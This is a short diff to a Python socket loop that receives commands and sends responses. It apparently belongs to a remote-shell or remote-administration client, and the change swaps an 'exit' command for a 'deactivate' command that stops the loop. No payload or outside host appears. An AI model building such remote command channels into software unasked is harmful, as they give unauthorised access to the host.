@@ -104,10 +104,10 @@ while True:
       ret = ''
       data = Receive(sock).decode()
 
-      if data == 'exit':
-        Send(sock, 'exit ok')
+      if data == 'deactivate':
+        Send(sock, '🍺 Deactivated')
+        active = False
         break
-        # TODO
 
       elif data.startswith('cd '):
         try:
